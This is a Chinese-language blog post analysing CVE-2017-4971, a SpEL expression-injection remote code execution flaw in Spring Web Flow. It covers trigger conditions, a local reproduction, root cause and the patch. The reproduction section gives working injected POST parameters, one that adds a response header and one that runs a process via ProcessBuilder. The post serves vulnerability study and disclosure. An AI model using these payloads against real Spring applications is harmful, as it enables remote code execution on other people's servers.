---
title: 【漏洞分析】Spring Web Flow框架远程代码执行(CVE-2017-4971)
date: 2017-07-18 23:03:05
categories: Web安全
tags:
    - JAVA
    - RCE
---

## 漏洞简介

**漏洞是由于Spring Web Flow的数据绑定问题带来的表达式注入，从而导致任意代码执行。** Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力，具体可以参考[Spring Web Flow 2.0 入门](https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html)。

<!-- more -->

**触发漏洞需要满足两个条件：**

* `MvcViewFactoryCreator` 对象的`useSpringBeanBinding` 参数需要设置为`false `（默认值）。
* flow `view`对象中设置`BinderConfiguration`对象为空

**影响版本：**

* Spring Web Flow 2.4.0 to 2.4.4
* Older unsupported versions are also affected

## 漏洞复现

漏洞测试源码为 [https://github.com/spring-projects/spring-webflow-samples/tree/master/booking-mvc](https://github.com/spring-projects/spring-webflow-samples/tree/master/booking-mvc)， 来源于Spring Web Flow官方的Example中的例子，booking-mvc中的某个流满足漏洞触发的条件

* flow `view`对象中设置`BinderConfiguration`对象为空

path: src/main/webapp/WEB-INF/hotels/booking/booking-flow.xml
{% asset_img 003.png %}
可以看出booking model中的confirm没有设置binder，也就是说在confirm阶段是可以触发漏洞的。

* `useSpringBeanBinding` 参数设置为`false `
  参数默认是false, 但是在官方例子中设置为`true`了, 需要改源码如下:

path: src/main/java/org/springframework/webflow/samples/booking/config/WebFlowConfig.java
{% asset_img 004.png %}
修改源码后，部署环境，然后访问，随便选取一个酒店进行预定。
{% asset_img 001.png %}

预定第二步拦截确认请求，增加post参数`_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("vulnerable","True").aaa=n1nty`如下，返回响应头中包含`vulnerable: True`, 验证漏洞。

```
POST /hotels/booking?execution=e1s2 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 203
Referer: http://127.0.0.1:8080/hotels/booking?execution=e1s2
Cookie: JSESSIONID=BF4269E94E8F9108D72B2FB9864C6E53
Connection: close
Upgrade-Insecure-Requests: 1

_eventId_confirm=&_csrf=92a961cd-69f5-4436-8834-a9b1e33ca87a&_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("vulnerable","True").aaa=n1nty

HTTP/1.1 302 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-store
Pragma: 
Expires: 
X-Frame-Options: DENY
vulnerable: True
Location: /hotels/search
Content-Length: 0
Date: Tue, 18 Jul 2017 06:23:18 GMT
Connection: close
```

弹个计算器试试, payload:
`_(new+java.lang.ProcessBuilder("/usr/bin/open", "/Applications/Calculator.app")).start()=iswin`
{% asset_img 002.png %}

## 漏洞流程

view对象处理用户事件，会根据HTTP参数绑定相应的model。
{% asset_img 005.png %}

如果model没有设置`BinderConfiguration`, 则会调用`addDefaultMappings`函数。
{% asset_img 006.png %}

进一步查看`addDefaultMappings`函数，可以发现输入参数以`fieldMarkerPrefix`("_")开头，则会调用`addEmptyValueMapping`函数。
{% asset_img 007.png %}

若`useSpringBeanBinding`参数设置为`false`,则 `expressionParser`将设置为`SpelExpressionParser `对象的实例，而不是`BeanWrapperExpressionParser `对象的实例。当调用`getValueType`函数时，`SpelExpressionParser `对象将执行表达式，触发任意代码执行。
{% asset_img 008.png %}

## 补丁分析

从补丁可以看出，直接将`ExpressionParser`设置为`BeanWrapperExpressionParser`对象的实例， 默认是执行不了表达式的。
{% asset_img 009.png %}

## Ref

* [CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework](https://blog.gdssecurity.com/labs/2017/7/17/cve-2017-4971-remote-code-execution-vulnerability-in-the-spr.html)
* [CVE-2017-4971：Spring WebFlow 远程代码执行漏洞分析](http://bobao.360.cn/learning/detail/3963.html)
* [Spring Web Flow 2.0 入门](https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html)
* [Spring 表达式语言 (SpEL)](http://spring.cndocs.tk/expressions.html)